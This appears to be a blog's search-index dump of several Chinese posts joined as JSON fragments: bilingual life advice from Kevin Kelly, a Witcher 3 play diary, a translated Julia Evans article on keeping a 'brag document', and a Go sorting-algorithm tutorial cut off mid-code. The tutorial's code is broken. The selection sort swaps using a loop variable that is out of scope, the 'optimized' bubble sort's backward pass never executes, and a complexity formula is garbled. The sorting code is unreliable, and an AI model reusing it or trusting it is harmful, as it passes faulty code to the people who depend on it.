needs to be at least 6 feet (2m) deep or it won’t be used. 切削时刀子的方向要朝外。 Always cut away from yourself. 让人群或醉鬼安静下来的办法是对他们低声耳语。 To quiet a crowd or a drunk, just whisper. 如果你觉得自己看到了一只老鼠，那一定是看到了。如果有一只的话，就一定会有更多。 If you think you saw a mouse, you did. And, if there is one, there are more. 蟑螂也是。 （闹钟响时）别按“稍后提醒（snooze）”按钮。这只能让你习惯性地睡过头。 Avoid hitting the snooze button. That’s just training you to oversleep. 手机设定是英文，日常看到“snooze”。 如果你能只吃三小口，那任何甜点随你吃。 You can eat any dessert you want if you take only 3 bites. 遇上卡住的螺栓时，记住：右旋（顺时针）紧，左旋（逆时针）松。 When you confront a stuck bolt or screw: righty tighty, lefty loosey. 要用你的臀部来跳舞。 Dance with your hips. …不会 所有的枪都是上了膛的。 All guns are loaded. 这是保证枪支安全的一条重要原则。永远不要将你的枪口对着人。感谢社会主义。 解开一团乱麻的最好方法不是去“解”，而是把它不断向外拉扯，尽可能让它变大、变松。打结处就会自然而然地解开。绳索、软管、毛线、电缆，都可以用这种方法。 The best way to untangle a knotty tangle is not to “untie” the knots, but to keep pulling the loops apart wider and wider. Just make the mess as big, loose and open as possible. As you open up the knots they will unravel themselves. Works on cords, strings, hoses, yarns, or electronic cables. 投资/消费建议 永远不要用信用卡去透支。唯一可接受的透支或负债，应该用来获取那些极可能增值的事物。绝大多数事物在你买下它的那一刻起就开始贬值了。别为那些没有未来的事物而透支。 Never use a credit card for credit. The only kind of credit, or debt, that is acceptable is debt to acquire something whose exchange value is extremely likely to increase, like in a home. The exchange value of most things diminishes or vanishes the moment you purchase them. Don’t be in debt to losers. 贷款购买超出消费水平的日用品及其愚蠢。 存钱和投资都是好习惯。几十年如一日不假思索地进行定期小额投资，是一条致富之道。 Saving money and investing money are both good habits. Small amounts of money invested regularly for many decades without deliberation is one path to wealth. 你购买实体商品时所花的每一元钱，将来都要再花一元钱去维修、保养，或是在它报废后处理掉它。 For every dollar you spend purchasing something substantial, expect to pay a dollar in repairs, maintenance, or disposal by the end of its life. 拥有物品很少能带给你极大的满足感。但拥有体验则能。 Acquiring things will rarely bring you deep satisfaction. But acquiring experiences will. 积攒那些用钱买不到的东西可以致富。 To be wealthy, accumulate all those things that money can’t buy. 在玩《地产大亨》（也译为《大富翁》、《强手棋》）时，尽你所能去购买、交换或是竞标那些橙色资产。别管那些水、电、气公司。 When playing Monopoly, spend all you have to buy, barter, or trade for the Orange properties. Don’t bother with Utilities. 为人处事 学着从那些你不认同甚至是冒犯你的人身上学习。看是否能从他们所信奉的东西中找到真相。 Learn how to learn from those you disagree with, or even offend you. See if you can find the truth in what they believe. 不要担心自己问的问题听起来很傻。99% 的情况下，其他人都有和你一样的问题，只不过羞于问出口而已。 Don’t be afraid to ask a question that may sound stupid because 99% of the time everyone else is thinking of the same question and is too embarrassed to ask it. 善于倾听是一种超能力。倾听你所喜欢的人时，要不时地追问「还有吗」，直到他们没有更多东西可讲。 Being able to listen well is a superpower. While listening to someone you love keep asking them “Is there more?”, until there is no more. 感恩可以解锁其他所有美德，也是你能做得更好的一件事情。 Gratitude will unlock all other virtues and is something you can get better at. 不管是旧识还是新交，请他吃饭都是一个既简单又行得通的办法。 Treating a person to a meal never fails, and is so easy to do. It’s powerful with old friends and a great way to make new friends. 大家其实都很羞涩。没准儿人们正等着你去向他们做自我介绍，或是给他们发邮件，或是约他们见面。大胆往前走。 Everyone is shy. Other people are waiting for you to introduce yourself to them, they are waiting for you to send them an email, they are waiting for you to ask them on a date. Go ahead. 如果被别人拒绝了，别往心里去。假设他们和你一样忙，一样腾不出手来，一样无暇分心。稍后再试一次。第二次的成功率超乎你想象。 Don’t take it personally when someone turns you down. Assume they are like you: busy, occupied, distracted. Try again later. It’s amazing how often a second try works. 及时回应是表示尊重的一种方式。 Promptness is a sign of respect. 你越有兴趣了解他人，他人就会发现你越有趣。要成为有趣的人，先要对别人感兴趣。 The more you are interested in others, the more interesting they find you. To be interesting, be interested. 尽你所能行慷慨之事。没人会在死前后悔给出去太多。 Optimize your generosity. No one on their deathbed has ever regretted giving too much away. “设身处地”是待人接物之道。它是所有其他美德的基石。 The Golden Rule will never fail you. It is the foundation of all other virtues. ：要有同理心。英文中，“黄金法则”是指应该用自己希望被对待的方式来对待他人。 犯错乃是人性。难的是责己。承认错误，勇于担责，并尽力弥补——没有什么比这更可贵的了。是自己搞砸的，就该坦承。这反而能彰显你的强大。 To make mistakes is human. To own your mistakes is divine. Nothing elevates a person higher than quickly admitting and taking personal responsibility for the mistakes you make and then fixing them fairly. If you mess up, fess up. It’s astounding how powerful this ownership is. 在场。坚持在场。某个成功人士说过：99% 的成功只不过是因为在场。 Show up. Keep showing up. Somebody successful said: 99% of success is just showing up. 也许宇宙中最违反直觉的真理就是，你给予他人越多，你收获的就越多。这是智慧的起点。 Perhaps the most counter-intuitive truth of the universe is that the more you give to others, the more you’ll get. Understanding this is the beginning of wisdom. 朋友胜过金钱。用钱能办到的事情，朋友可以做得更好。很多时候，自己有条船不如有个有船的朋友。 Friends are better than money. Almost anything money can do, friends can do better. In so many ways a friend with a boat is better than owning a boat. 相信我，你很难欺骗一个诚实的人。 This is true: It’s hard to cheat an honest man. 仇恨是一种对被仇恨者并无卵用的诅咒。它只会毒害仇恨者。把你的怨恨当作毒药一样丢掉吧。 Hatred is a curse that does not affect the hated. It only poisons the hater. Release a grudge as if it was a poison. 不要在邮件里对他人品头论足——如果这些话你不会当面说给那些人听的话。要知道，他们早晚会读到你的这些评论。 Don’t say anything about someone in email you would not be comfortable saying to them directly, because eventually they will read it. 如何道歉？快速，具体，真诚。 How to apologize: Quickly, specifically, sincerely. 当一个人对你粗鄙、无礼、刻薄、甚至是无耻下流时，当他们有病就好。这有利于你对他生出同情心，从而缓解冲突。 When someone is nasty, rude, hateful, or mean with you, pretend they have a disease. That makes it easier to have empathy toward them which can soften the conflict. 你绝不会想要出名。不信的话，随便找本名人传记读读。 You really don’t want to be famous. Read the biography of any famous person. 带有借口的道歉不是道歉；附有请求的夸赞也不是夸赞。 It’s not an apology if it comes with an excuse. It is not a compliment if it comes with a request. 如果某人试图让你相信这不是个老鼠会，那它就是个老鼠会。 If someone is trying to convince you it’s not a pyramid scheme, it’s a pyramid scheme. 背后夸人。别人也会背后夸你。 Compliment people behind their back. It’ll come back to you. 持续的愤怒会让你变得愚蠢。 Sustained outrage makes you stupid. 严以律己，宽以待人。反其道而行对谁来说都是灾难。 Be strict with yourself and forgiving of others. The reverse is hell for everyone. 当别人冒犯你时，最好的回应是“也许您是对的”。而通常他们确实是对的。 Your best response to an insult is “You’re probably right.” Often they are. 如果你不用在意别人的眼光，那你的力量就是无穷的。 If you can avoid seeking approval of others, your power is limitless. 别借钱给朋友，除非你已做好心理准备当作是送给他。 Don’t loan money to a friend unless you are ready to make it a gift. 在通往宏伟目标的路上，把每一次微不足道的胜利都当作最终目标来庆祝。这样无论在哪里结束，你都是胜利者。 On the way to a grand goal, celebrate the smallest victories as if each one were the final goal. No matter where it ends you are victorious. 镇定具有传染力。 Calm is contagious. 即便是一个蠢人，在大多数事情上也是对的。大多数老话都是有道理的。 Even a foolish person can still be right about most things. Most conventional wisdom is true. 从你的日程安排可以看出你看重什么事情；从你的交往圈子可以看出你会是什么样的人。 Show me your calendar and I will tell you your priorities. Tell me who your friends are, and I’ll tell you where you’re going. 狐朋狗友。 审视别人的弱点很容易；审视自己的弱点很难，但这会让你受益匪浅。 Contemplating the weaknesses of others is easy; contemplating the weaknesses in yourself is hard, but it pays a much higher reward. 还东西时，要让它比你借它时状态更好。清洗它，磨快它，加满它。 If you borrow something, try to return it in better shape than you received it. Clean it, sharpen it, fill it up. 每天记下一件让你感恩的事情。这是成本最低的（心灵）疗法。 Writing down one thing you are grateful for each day is the cheapest possible therapy ever. 如果人们告诉你某件事是错的，他们通常是对的；但如果他们告诉你该如何去解决问题，那通常都行不通。 When someone tells you something is wrong, they’re usually right. When someone tells you how to fix it, they’re usually wrong. 不用在意别人怎么看你。他们也并不在意你。 gnore what others may be thinking of you, because they aren’t. 不要以他人对你的恶意来待他，而要以你的善意来待他。 Don’t treat people as bad as they are. Treat them as good as you are. 每次去到别人那里都能给人带来祝福的话，那人们也很乐意帮你解决你的问题。 Each time you reach out to people, bring them a blessing; then they’ll be happy to see you when you bring them a problem. 碰上一个混蛋的话，不用理他。总是碰上混蛋的话，好好反省一下自己。 If you meet a jerk, overlook them. If you meet jerks everywhere everyday, look deeper into yourself. 如果你对某些人的愚蠢信念感到费解的话，不妨试着去理解他们为什么会有这种信念。 You can reduce the annoyance of someone’s stupid belief by increasing your understanding of why they believe it. 你遇到的每个人都会熟知某个你几乎一无所知的事物，而你的任务就是发现这个事物是什么。答案并非显而易见。 Every person you meet knows an amazing lot about something you know virtually nothing about. Your job is to discover what it is, and it won’t be obvious. 功劳归于他人，责难归于自己。 Always give credit, take blame. 某些事情即便不完美也很精彩，特别是婚礼。 Something does not need to be perfect to be wonderful. Especially weddings. 对敌之道是化敌为友。 To combat an adversary, become their friend. 商业 你既可以专注于服务你的客户或听众，也可以专注于打败你的竞争对手。两者都行得通。但专注于服务你的客户会让你走得更远。 You can obsess about serving your customers/audience/clients, or you can obsess about beating the competition. Both work, but of the two, obsessing about your customers will take you further. 当你被邀请在未来的某个时间点做某件事情时，问问自己：如果这件事情明天就启动，你会否接受？绝大多数邀约都经不住这种迫切性检验。 When you get an invitation to do something in the future, ask yourself: would you accept this if it was scheduled for tomorrow? Not too many promises will pass that immediacy filter. 尽力培训员工，使他们能有更多的职业机会；尽心善待员工，让他们永远不会考虑跳槽。 Train employees well enough they could get another job, but treat them well enough so they never want to. 金钱被高估了。真正的新事物很少需要大量金钱。不然的话，所有新发明都会被那些亿万富翁们所垄断，但并没有。相反，几乎所有的突破都来自于那些囊中羞涩的人——他们唯有依赖自己的热情、执着和才智，才能闯出一条新路来。穷，则思变。 Money is overrated. Truly new things rarely need an abundance of money. If that was so, billionaires would have a monopoly on inventing new things, and they don’t. Instead almost all breakthroughs are made by those who lack money, because they are forced to rely on their passion, persistence and ingenuity to figure out new ways. Being poor is an advantage in innovation. 能用钱解决的事儿就不叫事儿。 A problem that can be solved with money is not really a problem. 让别人付钱给你可成事；帮别人成事可致富。 To succeed, get other people to pay you; to become wealthy, help other people to succeed. 家庭 经常为你的孩子读书既能巩固你们的感情，也能开启他们的想象力。 Reading to your children regularly will bond you together and kickstart their imaginations. 当孩子不停地问“为什么”时，最聪明的回答是：“我不知道。你怎么看呢？” When a child asks an endless string of “why?” questions, the smartest reply is, “I don’t know, what do you think?” 孩子对立规矩其实是接受甚至欢迎的。家长想要立规矩的话，只需声明“我们家对这事儿有个规矩”。事实上，你想为自己定规矩的话，也只需要“我对这件事情有个规矩”这一个理由。 Children totally accept — and crave — family rules. “In our family we have a rule for X” is the only excuse a parent needs for setting a family policy. In fact, “I have a rule for X” is the only excuse you need for your own personal policies. 你与之步入婚姻的并非是一个人，而是一个家庭。 You don’t marry a person, you marry a family. 做一个称职的祖先，做一些造福子孙后代的事情。一件简单的事情就是种棵树。 Be a good ancestor. Do something a future generation will thank you for. A simple thing is to plant a tree. 善待子女，因为他们会决定你的养老条件。 Be nice to your children because they are going to choose your nursing home. 旅行 如果你把电源线、充电器什么的丢在或落在某个地方，不妨去问问你的酒店。绝大多数酒店都会有满满一抽屉的电源线、数据线和充电器——都是其他人落下的，没准儿其中就有你的。酒店也并不介意你借用后随身带走。 If you lose or forget to bring a cable, adapter or charger, check with your hotel. Most hotels now have a drawer full of cables, adapters and chargers others have left behind, and probably have the one you are missing. You can often claim it after borrowing it. 度假时，先跳过城市，去路线中最偏远的地方。这样你就能最大程度地体验到异域风情带给你的冲击。而在返程的路上，你则可以享受熟悉的城市所带给你的舒适。 On vacation go to the most remote place on your itinerary first, bypassing the cities. You’ll maximize the shock of otherness in the remote, and then later you’ll welcome the familiar comforts of a city on the way back. 假期 + 灾难 = 冒险。 A vacation + a disaster = an adventure. 如果你担心一趟带不上所有家伙事儿，那就分两次带好了。 If you have any doubt at all about being able to carry a load in one trip, do yourself a huge favor and make two trips. 搭便车时，要表现得像是你自己愿意搭载的人。 When hitchhiking, look like the person you want to pick you up. 即便在热带，夜晚也比你想象的冷。多带两件衣服。 Even in the tropics it gets colder at night than you think. Pack warmly. 防骗 任何人以任何借口向你索要账号信息，都可以认为他们是骗子，除非能证明他们是无辜的。而证明他们无辜的方法是，给你自己确知的号码打电话或登录你自己确知的网站，而不是用他们给你的号码或网页地址。不要在他们打给你的电话或是在回复他们发给你的消息、邮件中透露任何个人信息。你的数据安全你掌控。 Assume anyone asking for your account information for any reason is guilty of scamming you, unless proven innocent. The way to prove innocence is to call them back, or login to your account using numbers or a website that you provide, not them. Don’t release any identifying information while they are contacting you via phone, message or email. You must control the channel. 面对死亡kk 年近古稀对于死亡的看法颇多。 离世时，除了名声，你什么都带不走。 When you die you take absolutely nothing with you except your reputation. 上岁数之前，尽可能多地参加葬礼并听听人们的谈话。没人会谈论死者的成就。人们记住的只有死者的人品。 Before you are old, attend as many funerals as you can bear, and listen. Nobody talks about the departed’s achievements. The only thing people will remember is what kind of person you were while you were achieving. 达成目标所带给你的，远不及你为此而做出的自身改变。在你的葬礼上，人们不会记得你做过什么，只会记得你带给他们的感受。 What you get by achieving your goals is not as important as what you become by achieving your goals. At your funeral people will not recall what you did; they will only remember how you made them feel. 你的年轻程度取决于你上一次改变想法的时候（距今有多久）。 You are only as young as the last time you changed your mind. 我们并非短暂拥有灵魂的躯壳，而是短暂拥有躯壳的灵魂。 We are not bodies that temporarily have souls. We are souls that temporarily have bodies. 未知意义 相信我，这世上没有“他们”。 Trust me: There is no “them”. 出自爱尔兰摇滚乐队 U2 的一首歌 Invisible，”There’s no them / only us”。 永远不要在亚洲打陆战。 Never get involved in a land war in Asia. 亚洲广，人多且地形复杂？ 老爷子亚洲游有感。 适用于这些人生建议的建议 别信有什么万能药。 Don’t trust all-purpose glue. 这些建议并非什么金科玉律。它们更像是帽子。如果戴着不合适，换一顶就是了。 Advice like these are not laws. They are like hats. If one doesn’t fit, try another. 参考 赵佳敏：KK 在 68 岁生日时给出的 68 条建议 赵佳敏：KK 在 69 岁生日时给出的 99 条建议","link":"/posts/c6a7ef4.html"},{"title":"So long, gay 骆驼","text":"因为手机版塞尔达的称号入坑了原神，但是长草期过长和手机系统升级后卡顿的原因弃坑了玩起了 PC 游戏。先挑了口碑比较好的《黑魂3》试水，两款游戏都下载了大几个小时，好不容易过了古达老师和不经意间碰到就追着我砍的灰心哥，第二关在到达第二个记录点前各种花式死亡，终于在玩了 2 天后被劝退了。 之后转战《巫师3》这种难度简单点的剧情向游戏，3 周内通关了一周目和两个 DLC。虽然游戏有些年头了但还是能体验到曾经 3A 大作的魅力。这不比手游香多了！ 主线和两个补充内容大概可以分为： 百岁老人寻女记（一路打桩） 与恶魔的赌局 骇人恶兽结案并定居’童话世界陶森特’ 作为年纪过百的猎魔人，上可吊打狂猎，但高处摔下又会一命呜呼（骨质疏松）。作为经历过青草试炼情感被弱化的猎魔人，杰洛特在行事有自己的行为准则：不会因为委托者可怜就不收钱，也不会杀不作恶的怪物，所以做剧情选择的时候我都尽量选择符合这一原则的选项。巫师 3 有很强的代入感，随着主线和支线的交错逐渐丰满人物的形象。主线结束后回去凯尔莫罕逛了，只有熟悉的游戏开头梦境里的凯尔莫罕 BGM 和无尽的孤独感。 最终血与酒也给了主角一个安享晚年的结局，希望 gay 骆驼睡觉不再需要施放昆恩印吧。 其他一些有趣或值得回忆的东西 尼弗迦德军营偷装备：第一次偷东西被发现，就被比最终 boss 还猛的守卫几刀砍死。摸索了很久在偷开保箱前把门打开，楼梯下备好马，偷完立马一路狂奔，刺激～ 凯拉：打完桩第二天就把人杀了的屑杰洛特； 父女重逢：抱着希里”尸体“的绝望时刻； 凯尔莫罕大战：被剧情杀的维瑟米尔与兰伯特的葬礼； 坐骑萝卜：一吹哨就漂洋过海随时随地出现的萝卜，却经常被小栅栏卡住； 炼金术：从没用过猫眼和剑油； 其他：有点遗憾的是完血与酒的时候才知道有控制台整了一些装备和换肤，才发现怎么施放旋转剑舞和拜年剑法； 正如主线最后一个任务：结束是另一种开始。好游戏就应该留点念想，没玩昆特牌，清完问号或者继续二周目进行不同抉择也没关系。以后如果巫师 4 发售再来支持一下正版。 So long，Geralt of Rivia。","link":"/posts/5e24e4b2.html"},{"title":"吹嘘录","text":"让你的工作获得认可 – 构建你的吹牛文档 Get your work recognized: write a brag document - Julia Evans(内容有删减) 有些人会认为只有自己在工作中做得好，自然就会有人认可你的成绩，然后走上升职加薪的道路。实际情况要更复杂些-因为某些重要工作本身就比其他的更容易受人注视或者记得。自己做了重要的工作但是因为决策者不了解或不记得你所做的事情而得不到晋升是非常恼人的。因此，我想谈一谈我和很多与我共事的人所采用的策略！ 这篇文章内容不只是升职/加薪。实际上，这里的想法对我工作中的反思，正在学习的内容来说更有用，但最终它们肯定对升职有所帮助！ 你不会记得你做过的所有工作在绩效审核时让我很惊讶的是，我总是感到有一种“等待，最近六个月我做了什么？”的感觉。这是一种使人沮丧的感觉，通常不是基于现实，更多地是在“我忘记了我实际上做了什么很棒的事情”。 我总是不得不花大量时间查看我的合并请求，票证，电子邮件，设计文档等。我总是发现自己完全忘记了做过的小（有时不是那么小）事情，例如： 5个月前指导实习生 做了一个小型但是很重要的安全项目 花了几周的时间来帮助一个重要的迁移任务 帮助 X 整理了这个设计文档 上级不会记得你所做的一切工作如果你都不记得自己所做的所有重要事情，那么你的经理（无论他们有多出色！）可能也不会。他们需要向其他人解释为什么你应该被提升或给予诸如“超出期望”之类的评价（“ X的工作真棒！！！”) 因此，如果你的经理要有效地为你辩护，他们需要你的帮助。 战术：写一份文件，列出你的成就战术很简单！与其试图记住大脑所做的一切，不如保留一份列出所有内容的“吹牛文档”，以便在绩效评估季节可以参考它！这是一种非常常见的策略-当我开始这样做时，我向经验丰富者提到了这一点，他们就像“哦，是的，我这样做已经很长时间了，确实有帮助”。 在我工作的地方，我们称其为“吹牛文档”，但是我听到过相同概念的其他名称，例如“炒作文档”或“我做过的事情清单” 。 这篇文章的结尾有一个吹牛文档的基本模板。 分享你的吹牛文档当我第一次编写吹牛文档时，我很想与我的经理共享文档。感觉很奇怪，就像“嘿，呃，看看我今年所做的所有很酷的工作，我写了一个长长的文档列出了所有内容”。但是我的经理对此非常感激–我认为他的观点是“这使我的工作更加轻松，现在我可以在编写性能审查时查看文档，而不必试图记住发生了什么”。 向他们提供解释你的成就的文档，将真正帮助你的经理为你提倡有关绩效的讨论，并参加他们需要准备的任何会议。 吹牛文档也确实有助于经理过渡-如果你要在重要的绩效考核之前3个月找到一位新经理，请给他们一份吹牛文档，概述你最重要的工作及其影响将帮助他们理解你的工作。即使他们以前可能没有意识到你的任何工作，我们也一直在做。 同行评审同样，如果你的公司在绩效评定过程中进行了同行评审，请与评审者分享你的吹牛文档！！每次有人与我分享文档时，我都会发现写他的评论非常有帮助，出于相同的原因与你的经理分享非常有帮助-这让我想起了他们所做的所有很棒的工作，以及他们在目标中列出目标时吹牛文档还可以帮助我了解他们可能对最感兴趣的领域。 在某些工作团队中，与同行审阅者共享一份吹牛文档是一种团队规范，以使他们更轻松。 大局解释除了列出成就之外，在吹牛文档中，你还可以编写叙述来解释你的工作概况。你是否真的专注于安全性？建立你的产品技能并与用户建立真正良好的关系？在团队中建立强大的代码审查文化吗？ 在我的吹牛文档中，我喜欢通过针对我所关注的领域（例如“安全性”）创建一个部分，并列出我在该领域所做的所有工作来满足这一点。适用于你正在进行诸如“建立更强的代码审查文化”之类的模糊工作，且你针对此所做的所有工作可能都相对较小。 使用吹牛文档来识别职业发展规划过去，我发现吹牛文档不仅对宣传我的成就很有用，而且对反思我所做的工作也很有用。对我有帮助的一些问题如下： 我最感到骄傲的是什么工作？ 我应该考虑项目中这些主题吗？我正在做的工作的大背景是什么？ （我在安全性或本地化方面工作很多吗？）。 我希望自己正在做的事更多/更少？ 我的哪些项目达到了我想要的效果，哪些没有？为什么会这样呢？ X项目本可以做得更好？下次我可能想做些什么？ 可以一次全部写完或每2周更新一次许多人告诉我，他们适合每两周花几分钟时间更新其吹牛文档。对我来说，最好每6个月或每年进行一次“马拉松“比赛，让我仔细检查自己所做的一切并立即进行反思。尝试不同的方法，看看哪种对你有用！ 别忘了包含模糊工作我们中的许多人都在进行难以量化的模糊项目，例如： 提高团队的代码质量/使代码审查更加深入团队 使待命机制更轻松 建立更公平的面试过程/绩效评估系统 重构/减少技术债 很多人会选择不写这种工作，因为他们不知道如何解释为什么如此重要。但是我认为这种工作对于放入吹牛文档尤为重要，因为它最有可能被掩盖！解决此问题的一种方法是针对每个目标： 解释你的工作目标（为什么你认为重构X代码很重要？） 列出你为实现该目标所做的一些事情 列出你看到的任何工作带来的效果，即使它们是间接的 如果你告诉你的同事这类工作对你很重要，并告诉他们你正在做什么，也许他们也可以为你提供如何更有效地进行工作或使工作效果更加明显的主意！ 互相鼓励/庆祝成就有一个共同的想法，即在工作中维护一个吹牛文档是正常/良好的想法，其中一个很好的副作用是，我有时会看到人们互相鼓励互相记录和庆祝自己的成就（“嘿，你应该把这个放在吹牛文档中，真的很棒！”）有时候很难看清工作的价值，尤其是当你在努力工作时，朋友或同事的外部观点确实可以帮助你了解工作的重要性。 当你单独使用吹牛文档来吹嘘自己，它是不错的选择，但我认为，通过协作努力，人们可以识别出彼此的成就，因此吹牛文档会得到优化。 接下来，我想谈谈我们用来帮助​​人们认识自己的成就的两种结构。 吹牛研讨会：帮助人们列出自己的成就这种“吹牛文档”实践的开始方式是，我的同事卡拉和我想帮助其他工程技术领域的女性在绩效评估过程中更多地倡导自己。这样做的想法是，有些人对自己的成就的重视程度超出了他们应有的程度，因此，我们希望鼓励这些人“夸大其词”，并写下他们所做的重要事情。 为此，我们在绩效评估即将来临之前举办了“吹牛研讨会”。研讨会的形式是这样的： 第1部分：编写文档：1-2小时。每个人都坐着他们的笔记本电脑，开始浏览他们的合并请求，解决的需求，设计文档等，并汇总了他们在过去6个月中所做的重要事情。 第2部分：配对审查，使你的工作影响更加清晰：1小时。这部分的目的是组队，检查彼此的文档，并找出没有“足够”吹嘘的地方–也许他们对公司进行了极为关键的项目，但没有强调它的重要性，也许他们提高了测试性能，但没有说他们使测试速度提高了3倍，并且改善了所有人的开发经验。很容易不小心写下“我开发了$ feature”并错过了后续操作（“…导致$的事情发生了”）。另一个人阅读你的文档可以帮助你发现需要澄清影响的地方。 两周一次的吹牛文件撰写会议帮助人们记住自己成就的另一种方法：我的朋友戴夫每两周左右就会召集一些朋友，让每个人都更新他们的吹牛文档。对于人们来说，这是个很好的方式，谈论他们满意的工作并对其进行庆祝，并且在聚会中更新吹牛文档要比记住年底一次完成的所有操作容易得多。 这些人员不必是同一家公司甚至同一座城市的人-该小组通过视频聊天开会，并且有来自波特兰，多伦多，纽约和蒙特利尔的许多不同公司的人一起开会。 总的来说，特别是如果你是一个真正关心你工作的人，我认为与你的朋友和同事分享你的目标和成就（以及进展还不顺利的事情！）真的很积极。这使你不再像你一个人在工作，而像每个人都在互相支持以帮助他们完成自己想要的事情那样。 致谢感谢与我一起在工作中传播这个想法的Karla Burnett，感谢Dave Vasilevsky进行了吹牛文档写作会议，感谢Will Larson鼓励我首先开始其中的一个，感谢我的经理Jay Shirley一直以来都在鼓励并向我展示这是与经理合作的一种有用方法，并向艾莉，丹，劳拉，朱利安，卡迈勒，斯坦利和韦伯哈夫阅读了这份草案。 我还推荐博客文章“炒作自己”！你值得！由Aashni Shah撰写，他谈到了类似的方法。 附录: 吹嘘文档模板这是吹牛文档的模板！通常，我每年制作一份吹牛文件。 （“朱莉娅2017年吹牛文件”）。我认为可以将其设为较长/全面-一年的工作量为5-10页或更多对我来说似乎并不过分，特别是如果您要包括一些图表/图表/屏幕截图来显示效果的话你做了什么。 对于不喜欢吹牛的人，我想强调的一件事是–您不必设法使工作听起来比以前更好。只要使其听起来和它一样好就可以了！例如，“是X新功能的主要贡献者，该功能现已有60％的客户使用，并获得了Y的积极反馈”。 今/明年的目标 在这里列出你的主要目标！与你的经理和同事分享你的目标非常不错，因为它可以帮助他们了解如何为你实现这些目标提供支持！ 项目对于每个项目, 做出每个问题: 你的贡献是什么（你是否提出了设计？你构建了哪些组件？你提出了一些有用的见解，例如“我们可以缩小范围，并通过减少工作量来做我们想要的事情吗？”） 项目的影响–是为谁做的？你可以附加上一些有意义的指标吗？ （节省的X美元？提供了有助于销售Y大笔交易的新功能？性能提高了X％？每天有X个内部用户使用？）。它是否支持一些重要的非数字公司目标（需要通过审核？帮助保留了重要的用户？） 请记住：别忘了解释你的工作成果到底是什么！通常，重要的是要在几个月后返回并填写启动项目后实际发生的情况。 合作与指导 在你所擅长的领域内帮助其他人（例如“其他工程师经常要求我提供一次性帮助来解决CSS中怪异的错误”或“在适当时机引用C标准”） 指导实习生/帮助新团队成员入门 编写非常清晰的电子邮件/会议记录 编写其他人基于其构建的基础代码 改善监控/仪表板 你花了特别长的时间/你认为特别重要的任何代码审查 你回答的重要问题（“帮助OTHER_TEAM的Risha解决了许多与Y相关的问题”） 指导某人参与某个项目（“不时向Ben提供有关领导他的第一个大项目的建议”） 进行内部演讲或研讨会 设计和文档记录列出你工作过的设计稿和文档 设计文档：我通常只说“为X写设计”或“针对X的审阅设计” 文档：也许可以简要解释本文档的目标（例如“关于X的问题很多，所以我记录了下来，现在我们可以更快地回答这些问题了”） 公司建设这类别基本上是指“你为帮助公司整体而不仅仅是你的项目/团队所做的事情”。这里有一些例子： 更多面试或招聘（进行校园招聘等） 改善重要流程，例如面试流程或编写更好的入职材料 学习过的东西我的朋友朱利安（Julian）建议了此部分，我认为这是个好主意-尝试列出你学到的重要知识或最近获得的技能！你可能正在学习或提高的一些技能示例 如何进行性能分析和使代码运行更快 重要软件（例如JVM或Postgres或Linux）的内部(源码) 如何使用库（如React） 如何使用重要开发工具（例如命令行或Firefox开发人员工具） 关于特定的编程领域（例如本地化或时区） 产品管理/用户体验设计等领域 如何编写清晰的设计文档 一种新的编程语言 你真的很容易忘记正在学习的技能，通常，当我反思这一点时，我意识到我学到的东西比我想象的要多得多，并且还注意到了一些我没有学到的东西 工作以外业余成就 博客/帖子 会谈小组 开源项目 工业认证 我认为这可能是一种很好的方式，可以突出你在工作上的严格意义之外的职业想法。如果你觉得这很不错，还可以包括其他与职业无关的事情！有些人喜欢保留一份个人+工作吹牛文件。 提示如果感觉真的无成就可讲， 尝试一下 如果你正在尝试一个朋友来加入你所在的公司/团队, 你会怎么介绍你的工作? 最近有没有任何人告诉你在某件事上做得不错? 原文链接： https://jvns.ca/blog/brag-documents/","link":"/posts/ade9e456.html"},{"title":"常见排序算法总结","text":"冒泡排序冒泡排序又称为泡式排序，是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 12345678910func bubbleSort(L []int) { var n = len(L) for i := 0; i &lt; n; i++ { for j := 0; j &lt; n - 1 - i; j++ { if L[j] &gt; L[j+1] { swap(L, j, j+1) } } }} 1 次这样的循环可以得到一个最大值, 我们可以通过在每次循环中记录最后的交换的位置(pos)以及双向冒泡来进行性能优化。 12345678910111213141516171819202122232425func bubbleSort2(L []int) []int { start := 0 end := len(L) - 1 for start &lt; end { var startPos, endPos int for i := start; i &lt; end; i++ { if L[i] &gt; L[i+1] { endPos = i swap(L, i, i+1) } } end = endPos for j := end; j &lt; end; j-- { if L[j] &gt; L[j-1] { startPos = j swap(L, j, j-1) } } start = startPos } return L} This simple algorithm performs poorly in real world use and is used primarily as an educational tool. 冒泡排序是一个稳定的排序算法，时间复杂度 O(n²), 交换 O(n²)， 不过任何优化也改变不了这是一个教育级算法的事实… 选择排序选择排序是一种简单直观的排序算法。它的工作原理如下。首先在未排序序列中找到最小元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 选择排序的主要优点与数据移动有关。如果某个元素位于正确的最终位置上，则它不会被移动。 123456789101112func selectionSort(L []int) { var n = len(L) for i := 0; i &lt; n; i++ { var minIdx = i for j := i + 1; j &lt; n; j++ { if L[j] &lt; L[minIdx] { minIdx = j } } swap(L, j, minIdx) }} 选择排序的交换操作介于0和(n-1)次之间。选择排序的比较操作为n(n-1)/2次。选择排序的赋值操作介于0和3(n-1)次之间。 比较次数O(n^2)，比较次数与关键字的初始状态无关，总的比较次数(n-1)/2}N=(n-1)+(n-2)+...+1=n\\times (n-1)/2。交换次数O(n)，最好情况是，已经有序，交换0次；最坏情况是，逆序，交换n-1次。交换次数比冒泡排序较少，由于交换所需CPU时间比比较所需的CPU时间多，n值较小时，选择排序比冒泡排序快。 原地操作几乎是选择排序的唯一优点，当空间复杂度要求较高时，可以考虑选择排序；实际适用的场合非常罕见。 归并排序 分割: 递归地把当前数组平均分割成两半 集成：在保持元素顺序的同时将上一步得到的子序列集成到一起（归并） 归并排序使用分而治之的思想，以折半的方式来递归/迭代排序元素，利用空间(存储分隔的数组)来换时间，做到了时间复杂度 O(n·log(n)) 的同时保持了稳定. 这让它在一些更考虑排序效率和稳定性，次考虑存储空间的场合非常适用（如数据库内排序）。和堆排序相比有同样的时间复杂度, 但是堆排序的O(1)辅助空间显然更胜一筹, 但是归并排序的稳定是优点, 且归并排序非常适合于链表排序。 1234567891011121314151617181920212223242526272829303132333435363738func mergeSort(L []int) []int { if len(L) &lt;= 1 { return L } //递[归] middle := len(L) / 2 //不断地进行左右对半划分 left := 